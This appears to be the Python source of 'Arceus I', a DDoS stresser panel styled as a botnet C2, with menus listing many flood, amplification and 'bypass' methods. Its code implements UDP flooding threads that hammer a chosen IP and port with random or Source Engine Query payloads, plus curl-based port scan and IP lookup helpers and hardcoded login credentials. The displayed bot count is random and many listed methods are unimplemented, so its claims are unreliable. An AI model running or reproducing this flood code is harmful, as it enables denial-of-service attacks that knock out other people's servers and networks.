#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket
import time
import random
import threading
import getpass
import os
import json
method = """\033[38;5;201m╔═════════════════════════════════════════════════════╗ 
\r\033[38;5;201m║ \033[38;5;202mArceus I \033[38;5;201m- \033[38;5;202mDDoS Method Listing \033[38;5;201m- \033[38;5;202mAttack Method CmDs \033[38;5;201m║ 
\r\033[38;5;201m╠═════════════════════════════════════════════════════╣ 
\r\033[38;5;201m║ \033[38;5;202m.STD \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] [\033[38;5;202mPORT\033[38;5;201m] [\033[38;5;202mTIME\033[38;5;201m]                             \033[38;5;201m║ ╔══════════════════════╗
\r\033[38;5;201m║ \033[38;5;202m.UDP \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] [\033[38;5;202mPORT\033[38;5;201m] [\033[38;5;202mTIME\033[38;5;201m] \033[38;5;202m32 1460 10                  \033[38;5;201m║ ║ \033[38;5;202mSuggested Port\033[38;5;201m:\033[38;5;202m62627 \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.JUNK \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] [\033[38;5;202mPORT\033[38;5;201m] [\033[38;5;202mTIME\033[38;5;201m]                            \033[38;5;201m║ ║ \033[38;5;202mSuggested PSize\033[38;5;201m:\033[38;5;202m1460 \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.STOMP \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] [\033[38;5;202mPORT\033[38;5;201m] [\033[38;5;202mTIME\033[38;5;201m] \033[38;5;202m32 ALL 1460 10            \033[38;5;201m║ ║ \033[38;5;202mSuggested Method\033[38;5;201m:\033[38;5;202mSTD \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.TCP \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] [\033[38;5;202mPORT\033[38;5;201m] [\033[38;5;202mTIME\033[38;5;201m] \033[38;5;202m32 \033[38;5;93m(\033[38;5;202mFlags\033[38;5;93m/\033[38;5;202mALL\033[38;5;93m)\033[38;5;202m 0 10         \033[38;5;201m║ ║ \033[38;5;202mSuggested Method\033[38;5;201m:\033[38;5;202mUDP \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.XMAS \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] [\033[38;5;202mPORT\033[38;5;201m] [\033[38;5;202mTIME\033[38;5;201m]                            \033[38;5;201m║ ║ \033[38;5;202mMax Time\033[38;5;201m: \033[38;5;202mNO         \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.CRUSH \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] [\033[38;5;202mPORT\033[38;5;201m] [\033[38;5;202mTIME\033[38;5;201m] \033[38;5;202m32 ALL 1460 10            \033[38;5;201m║ ╚══════════════════════╝
\r\033[38;5;201m║ \033[38;5;202m.STOP \033[38;5;201m[\033[38;5;202mThis will stop your attack!\033[38;5;201m]                 \033[38;5;201m║ 
\r\033[38;5;201m╚═════════════════════════════════════════════════════╝"""

tools ="""              \033[38;5;201m╔═════════════════════════════════════╗
\r              \033[38;5;201m║  \033[38;5;202mArceus I \033[38;5;201m- \033[38;5;202mUser Tools \033[38;5;201m- \033[38;5;202mTool CmDs  \033[38;5;201m║
\r              \033[38;5;201m╠═════════════════════════════════════╣            
\r              \033[38;5;201m║ \033[38;5;202miplookup \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] - \033[38;5;202mIP Geolocation      \033[38;5;201m║
\r              \033[38;5;201m║ \033[38;5;202mportscan \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] - \033[38;5;202mPortScanner         \033[38;5;201m║
\r              \033[38;5;201m║ \033[38;5;202mresolve \033[38;5;201m[\033[38;5;202mHOST\033[38;5;201m] - \033[38;5;202mHostname Resolver  \033[38;5;201m║
\r              \033[38;5;201m╚═════════════════════════════════════╝"""

ipmi = """\033[38;5;201m╔═════════════════════════╗    ╔════════════════════╗    ╔════════════════════╗
\r\033[38;5;201m║   \033[38;5;82mScanned Methods II    \033[38;5;201m║    ║ \033[38;5;202mDefault Port\033[38;5;201m:\033[38;5;82m 62141\033[38;5;201m║    ║\033[38;5;202m To Kill IPHM / AMP \033[38;5;201m║
\r\033[38;5;201m╠═════════════════════════╣    ║ \033[38;5;202mDefault time\033[38;5;201m:\033[38;5;82m 300  \033[38;5;201m║    ║\033[38;5;202m    Based Attacks   \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.dns \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]        \033[38;5;201m║    ║ \033[38;5;202mDefault Threads\033[38;5;201m:\033[38;5;82m 2 \033[38;5;201m║    ║\033[38;5;202m Open a new window  \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.mdns \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]       \033[38;5;201m║    ║ \033[38;5;202mWorking On Manual  \033[38;5;201m║    \033[38;5;201m║\033[38;5;202m   And type \033[38;5;82m.kill   \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.db2 \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]        \033[38;5;201m║    ║ \033[38;5;202m Input For Users   \033[38;5;201m║    \033[38;5;201m║\033[38;5;202m   Hope you enjoy!  \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.arceus \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]     \033[38;5;201m║    ╚════════════════════╝    ╚════════════════════╝
\r\033[38;5;201m║ \033[38;5;202m.echo \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]       \033[38;5;201m║    ╔════════════════════╗    ╔════════════════════╗
\r\033[38;5;201m║ \033[38;5;202m.snmp \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]       \033[38;5;201m║    ║   \033[38;5;82mVIP Methods II   \033[38;5;201m║    ║  \033[38;5;82mLayer7 Methods I  \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.memcache \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]   \033[38;5;201m║    ╠════════════════════╣    ╠════════════════════╣
\r\033[38;5;201m║ \033[38;5;202m.rip \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]        \033[38;5;201m║    ║ \033[38;5;202m.msqdnm \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]\033[38;5;201m║    ║  \033[38;5;82mCOMING SOON       \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.reaper \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]     \033[38;5;201m║    ║ \033[38;5;202m.tfdnp \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m] \033[38;5;201m║    ║ \033[38;5;202m.omega \033[38;5;201m[\033[38;5;202mURL\033[38;5;201m]       \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.heartbeat \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]  \033[38;5;201m║    ║ \033[38;5;202m.lndp \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]  \033[38;5;201m║    ║ \033[38;5;202m.arme \033[38;5;201m[\033[38;5;202mURL\033[38;5;201m]        \033[38;5;201m║
\r\033[38;5;201m╚═════════════════════════╝    ║ \033[38;5;202m.ardmsp \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]\033[38;5;201m║    ║  \033[38;5;82mCOMING SOON       \033[38;5;201m║
\r\033[38;5;201m╔═════════════════════════╗    ╠════════════════════╣    ╠════════════════════╣
\r\033[38;5;201m║     \033[38;5;82mTCP-Collection      \033[38;5;201m║    ║  \033[38;5;82mExtra Methods III \033[38;5;201m║    ║  \033[38;5;82mExtra Methods IV  \033[38;5;201m║\r\033[38;5;201m╠═════════════════════════╣    ╠════════════════════╣    ╠════════════════════╣
\r\033[38;5;201m║ \033[38;5;202m.psh \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]               \033[38;5;201m║    ║ \033[38;5;202m.gnade \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m] ║    ║ \033[38;5;202m.uvse \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]  \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.rst \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]               \033[38;5;201m║    ║ \033[38;5;202m.zap \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]   ║    ║ \033[38;5;202m.uvsd \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]  \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.fin \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]               \033[38;5;201m║    ║ \033[38;5;202m.rawudp \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]       ║    ║ \033[38;5;202m.ejunk \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m] \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.urg \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]               \033[38;5;201m║    ║ \033[38;5;202m.bogus \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m] ║    ║ \033[38;5;202m.xanax \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]        \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.ack \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]               \033[38;5;201m║    ║ \033[38;5;202m.wizard \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]║    ║ \033[38;5;202m.frag \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]  \033[38;5;201m║
\r\033[38;5;201m╚═════════════════════════╝    ╚════════════════════╝    ╚════════════════════╝"""


iphm = """\033[38;5;201m╔═════════════════════════╗    ╔════════════════════╗    ╔════════════════════╗
\r\033[38;5;201m║    \033[38;5;82mScanned Methods I    \033[38;5;201m║    ║ \033[38;5;202mDefault Port\033[38;5;201m: \033[38;5;82m62141\033[38;5;201m║    ║\033[38;5;202m To Kill IPHM / AMP \033[38;5;201m║
\r\033[38;5;201m╠═════════════════════════╣    ║ \033[38;5;202mDefault time\033[38;5;201m: \033[38;5;82m300  \033[38;5;201m║    ║\033[38;5;202m    Based Attacks   \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.ldap \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]       \033[38;5;201m║    ║ \033[38;5;202mDefault Threads\033[38;5;201m: \033[38;5;82m2 \033[38;5;201m║    ║\033[38;5;202m Open a new window  \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.ntp \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]        \033[38;5;201m║    ║ \033[38;5;202mWorking On Manual  \033[38;5;201m║    ║\033[38;5;202m   And type \033[38;5;82m.kill   \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.tftp \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]       \033[38;5;201m║    ║ \033[38;5;202m Input For Users   \033[38;5;201m║    ║\033[38;5;202m   Hope you enjoy!  \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.ssdp \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]       \033[38;5;201m║    ╚════════════════════╝    ╚════════════════════╝
\r\033[38;5;201m║ \033[38;5;202m.portmap \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]    \033[38;5;201m║    ╔════════════════════╗    ╔════════════════════╗
\r\033[38;5;201m║ \033[38;5;202m.chargen \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]    \033[38;5;201m║    ║ \033[38;5;82m Server Methods I  \033[38;5;201m║    ║  \033[38;5;82mBypass Methods II \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.sentinel \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]   \033[38;5;201m║    ╠════════════════════╣    ╠════════════════════\033[38;5;201m╣
\r\033[38;5;201m║ \033[38;5;202m.netbios \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]    \033[38;5;201m║    ║ \033[38;5;202m.winsyn \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]       \033[38;5;201m║    ║ \033[38;5;202m.ovhbypass \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]    \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.mssql \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]      \033[38;5;201m║    ║ \033[38;5;202m.winseqid \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]     \033[38;5;201m║    ║ \033[38;5;202m.cfbypass \033[38;5;201m[\033[38;5;202mURL\033[38;5;201m]    \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.ts3 \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]        \033[38;5;201m║    ║ \033[38;5;202m.yubina \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]       \033[38;5;201m║    ║ \033[38;5;202m.nfobypass \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]    \033[38;5;201m║
\r\033[38;5;201m╚═════════════════════════╝    ║ \033[38;5;202m.prowin \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]       \033[38;5;201m║    ║ \033[38;5;202m.bo4bypass \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]    \033[38;5;201m║
\r\033[38;5;201m╔═════════════════════════╗    ╠════════════════════╣    ╠════════════════════╣
\r\033[38;5;201m║    \033[38;5;82m VIP Methods I       \033[38;5;201m║    ║  \033[38;5;82m Extra Methods I  \033[38;5;201m║    ║  \033[38;5;82mExtra Methods II  \033[38;5;201m║
\r\033[38;5;201m╠═════════════════════════╣    ╠════════════════════╣    ╠════════════════════\033[38;5;201m╣
\r\033[38;5;201m║ \033[38;5;202m.HUN-FUN \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]    \033[38;5;201m║    ║ \033[38;5;202m.vse \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]          \033[38;5;201m║    ║ \033[38;5;202m.essyn \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m] \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.ASS-CRK \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]    \033[38;5;201m║    ║ \033[38;5;202m.telnet \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m]       \033[38;5;201m║    ║ \033[38;5;202m.csyn \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]  \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.EFT-PWR \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]    \033[38;5;201m║    ║ \033[38;5;202m.tbuse \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m] \033[38;5;201m║    ║ \033[38;5;202m.xsyn \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]  \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.PMP-PMP \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]    \033[38;5;201m║    ║ \033[38;5;202m.udbs \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]  \033[38;5;201m║    ║ \033[38;5;202m.zsyn \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]  \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.ZCH-CRI \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]    \033[38;5;201m║    ║ \033[38;5;202m.dom \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m]   \033[38;5;201m║    ║ \033[38;5;202m.issyn \033[38;5;201m[\033[38;5;202mIP\033[38;5;201m] \033[38;5;201m[\033[38;5;202mPORT\033[38;5;201m] \033[38;5;201m║
\r\033[38;5;201m╚═════════════════════════╝    ╚════════════════════╝    ╚════════════════════╝"""


help = """\r           \033[38;5;201m╔══════════════════════════════════════════════╗
\r           \033[38;5;201m║   \033[38;5;202mArceus I \033[38;5;201m-\033[38;5;202m Main Command List \033[38;5;201m- \033[38;5;202mExtra Cmds  \033[38;5;201m║
\r           \033[38;5;201m╠══════════════════════════════════════════════╣
\r           \033[38;5;201m║ \033[38;5;202m.stress \033[38;5;201m- \033[38;5;202mShows a list of available methods  \033[38;5;201m║
\r           \033[38;5;201m║ \033[38;5;202m.clear \033[38;5;201m-\033[38;5;202m Clears the Screen                   \033[38;5;201m║
\r           \033[38;5;201m║ \033[38;5;202m.logout \033[38;5;201m- \033[38;5;202mLogs out, and closes the C2        \033[38;5;201m║
\r           \033[38;5;201m║ \033[38;5;202m.bots \033[38;5;201m- \033[38;5;202mShows a list of connected devices    \033[38;5;201m║
\r           \033[38;5;201m║ \033[38;5;202m.info \033[38;5;201m- \033[38;5;202mShows a list of user information     \033[38;5;201m║
\r           \033[38;5;201m║ \033[38;5;202m.tools \033[38;5;201m-\033[38;5;202m Shows a list of available tools     \033[38;5;201m║
\r           \033[38;5;201m║ \033[38;5;202m.staff \033[38;5;201m- \033[38;5;202mAdministrators only!                \033[38;5;201m║
\r           \033[38;5;201m║ \033[38;5;202m.vip \033[38;5;201m- \033[38;5;202mVIPs Only!                            \033[38;5;201m║
\r           \033[38;5;201m║ \033[38;5;202m.iphm \033[38;5;201m- \033[38;5;202mIPHM / AMP Based Attacks!            \033[38;5;201m║
\r           \033[38;5;201m║ \033[38;5;202m.ipmi \033[38;5;201m- \033[38;5;202mIPHM / AMP Based Attacks v2!         \033[38;5;201m║
\r           \033[38;5;201m║ \033[38;5;202m.scanners \033[38;5;201m- \033[38;5;202mAdministrators only!             \033[38;5;201m║
\r           \033[38;5;201m╚══════════════════════════════════════════════╝"""
cookie = open(".sinfull_cookie","w+")

fsubs = 0
tpings = 0
pscans = 0
liips = 0
attack = True
tattacks = 0
xmas = True
aid = 0

def udpsender(host, port, timer, payload):
	global aid

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	aid += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	aid -= 1

def vsesender(host, timer, port, payload):
	global aid

	timeout = time.time() + float(timer)
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	
	aid += 1
	while time.time() < timeout and attack:
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
		sock.sendto(payload, (host, int(port)))
	aid -= 1

def main():
	global fsubs
	global tpings
	global pscans
	global liips
	global tattacks
	global atk
	global iad
	global dp
	global syn
	global std
	global tcp
	global xmas
	global ack

	while True:
		bots = (random.randint(9,15))
		sys.stdout.write("\x1b]2; Arceus I [BETA] | IoT Devices: {} | Administrators: 1\x07".format(bots))
		sin = input("\033[38;5;93m[\033[38;5;202m{}\033[38;5;93m@\033[38;5;202mArceus\033[38;5;93m]\033[38;5;154m$\033[38;5;202m ".format(username)).lower()
		nvinput = sin.split(" ")[0]
		if nvinput == "clear":
			os.system ("clear")
			print (banner)
			main()
		if nvinput == "cls":
			os.system ("clear")
			print (banner)
			main()
		elif nvinput == "stress":
			os.system("clear")
			print (method)
			main()
		elif nvinput == ".help":
			os.system("clear")
			print (help)
			main()
		elif nvinput == "help":
			os.system("clear")
			print (help)
			main()
		elif nvinput == "?":
			os.system("clear")
			print (help)
			main()
		elif nvinput == ".stress":
			os.system("clear")
			print (method)
			main()
		elif nvinput == ".iphm":
			os.system("clear")
			print (iphm)
			main()
		elif nvinput == "iphm":
			os.system("clear")
			print (iphm)
			main()
		elif nvinput == "ipmi":
			os.system("clear")
			print (ipmi)
			main()
		elif nvinput == ".ipmi":
			os.system("clear")
			print (ipmi)
			main()
		elif nvinput == ".tools":
			os.system("clear")
			print (tools)
			main()
		elif nvinput == "tools":
			os.system("clear")
			print (tools)
			main()
		elif nvinput == "portscan":
			try:
				nvinput, host = sin.split(" ")
				ip = socket.gethostbyname(host)
				os.system("curl https://api.hackertarget.com/nmap/?q={}".format(ip))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif nvinput == "resolve":
			try:
				nvinput, hostname = sin.split(" ")
				ip = socket.gethostbyname(hostname)
				print("\033[97m {}".format (ip))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif nvinput == "iplookup":
			try:
				nvinput, host = sin.split(" ")
				ip = socket.gethostbyname(host)
				os.system("curl http://ip-api.com/line/{}".format(ip))
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif nvinput == "":
			main()
		elif nvinput == ".logout":
			exit()
		elif nvinput == "logout":
			exit()
		elif nvinput == "methods":
			print (method)
			main()
		elif nvinput == ".tcp":
			try:
				nvinput, host, port, timer, arg1, flags, arg2, arg3 = sin.split(" ")
				socket.gethostbyname(host)
				size = 4096
				dsize = random._urandom(int(size))
				threading.Thread(target=udpsender, args=(host, timer, port, dsize)).start()
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif nvinput == ".udp":
			try:
				nvinput, host, port, timer, arg1, size, arg2 = sin.split(" ")
				socket.gethostbyname(host)
				dsize = random._urandom(int(size))
				threading.Thread(target=udpsender, args=(host, timer, port, dsize)).start()
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif nvinput == ".junk":
			try:
				nvinput, host, port, timer = sin.split(" ")
				socket.gethostbyname(host)
				payload = b"\x73\x74\x64\x00\x00\x00\x00\x00"
				threading.Thread(target=vsesender, args=(host, timer, port, payload)).start()
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif nvinput == ".stomp":
			try:
				nvinput, host, port, timer, arg1, flags, size, arg2 = sin.split(" ")
				socket.gethostbyname(host)
				dsize = random._urandom(int(size))
				threading.Thread(target=udpsender, args=(host, timer, port, dsize)).start()
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif nvinput == ".crush":
			try:
				nvinput, host, port, timer, arg1, flags, size, arg2 = sin.split(" ")
				socket.gethostbyname(host)
				dsize = random._urandom(int(size))
				threading.Thread(target=udpsender, args=(host, timer, port, dsize)).start()
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif nvinput == ".std":
			try:
				nvinput, host, port, timer = sin.split(" ")
				socket.gethostbyname(host)
				payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
				threading.Thread(target=vsesender, args=(host, timer, port, payload)).start()
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif nvinput == ".xmas":
			try:
				nvinput, host, port, timer, arg1, arg2, arg3 = sin.split(" ")
				socket.gethostbyname(host) 
				payload = b"\xff\xff\xff\xffTSource Engine Query\x00"
				threading.Thread(target=vsesender, args=(host, timer, port, payload)).start()
			except ValueError:
				main()
			except socket.gaierror:
				main()
		elif nvinput == ".stop":
			attack = False
			while not attack:
				if aid == 0:
					attack = True

		else:
			print ("\033[93mInvalid \033[91mcommand or syntax")
			main()


try:
	clear = "clear"
	os.system(clear)
	credential = {"root" : "", "arsenoa" : "stocazzo"}
	success = False
	for i in range(3):
		username = input("Username: ")
		password = getpass.getpass("Password: ")
		if (credential.get(username) == password):
			success = True
			break
		else:
			print("\033[091mError:\033[0m Login Failed")
		sys.exit()
	if not success:
		print("\033[091mError:\033[0m Login Failed")
		sys.exit()
	os.system("clear")
	banner = """\033[38;5;201m╔════════════════════════════════════╗                ╔════════════════════════╗
\r\033[38;5;201m║  \033[38;5;202mArceus I \033[38;5;201m-\033[38;5;202m Main Menu \033[38;5;201m- \033[38;5;202mWelcome!   \033[38;5;201m║         ╔══════╣ \033[38;5;202mSuggested Port\033[38;5;201m: \033[38;5;82m80     \033[38;5;201m║
\r\033[38;5;201m╠════════════════════════════════════╣         ║      ║ \033[38;5;202mSuggested Psize\033[38;5;201m: \033[38;5;82m1460  \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m   Welcome to Project Arceus I     \033[38;5;201m╠═══╗     ║      ║ \033[38;5;202mSuggested Method\033[38;5;201m: \033[38;5;82mSTD  \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m This source is currently in beta  \033[38;5;201m║   ║   ╔═╩══╗   ║ \033[38;5;202mMax Attack time\033[38;5;201m: \033[38;5;82mNO    \033[38;5;201m║
\r\033[38;5;201m╚═══════════════╦════════════════════╝   ╚═══╣ \033[38;5;93m<3 \033[38;5;201m╠═╗ ╚════════════════════════╝
\r\033[38;5;201m                ║                            \033[38;5;201m╚════╝ ║
\r\033[38;5;201m                ║ \033[38;5;93mMade \033[38;5;202mby \033[38;5;93mzEspEnder1112\033[38;5;201m             ║
\r\033[38;5;201m╔═══════════════╩══════════════════╗    \033[38;5;201m            ║
\r\033[38;5;201m║  \033[38;5;202mArceus I \033[38;5;201m- \033[38;5;202mCommand List \033[38;5;201m-\033[38;5;202m CMDs  \033[38;5;201m║ ╔══════════════╩══════════════════════════╗
\r\033[38;5;201m╠══════════════════════════════════╣ ║ \033[38;5;202mOS_System\033[38;5;201m:\033[38;5;202m CentOS \033[38;5;201m[\033[38;5;202m6\033[38;5;201m] - [\033[38;5;202m7\033[38;5;201m]             \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.help \033[38;5;201m- \033[38;5;202mFull List of Commands    \033[38;5;201m║ ║ \033[38;5;202mCCR: XXX-223-389                        \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.stress \033[38;5;201m-\033[38;5;202m List of DDoS Commands  \033[38;5;201m╠═╣ \033[38;5;202mCIPHER\033[38;5;201m: \033[38;5;202mSHA-512 \033[38;5;201m, \033[38;5;202mAES-BYTE \033[38;5;201m, \033[38;5;202mCIPHER-TLS \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.logout\033[38;5;201m -\033[38;5;202m Logs out of the C2     \033[38;5;201m║ ║ \033[38;5;202mSTATE\033[38;5;201m: \033[38;5;202mPRIVATE                          \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.clear \033[38;5;201m- \033[38;5;202mClears screen           \033[38;5;201m║ ║ \033[38;5;202mOBJ-TYPE\033[38;5;201m: \033[38;5;202mC2 SOURCE X TELNET LAYER      \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.tools \033[38;5;201m-\033[38;5;202m List of available tools \033[38;5;201m║ ║ \033[38;5;202mLSC\033[38;5;201m: \033[38;5;202mGL3.0                              \033[38;5;201m║
\r\033[38;5;201m║ \033[38;5;202m.iphm \033[38;5;201m-\033[38;5;202m AMP Attack Methods       \033[38;5;201m║ ║ \033[38;5;202mPRJ-VAS\033[38;5;201m: \033[38;5;202m6949-3853-9891                 \033[38;5;201m║
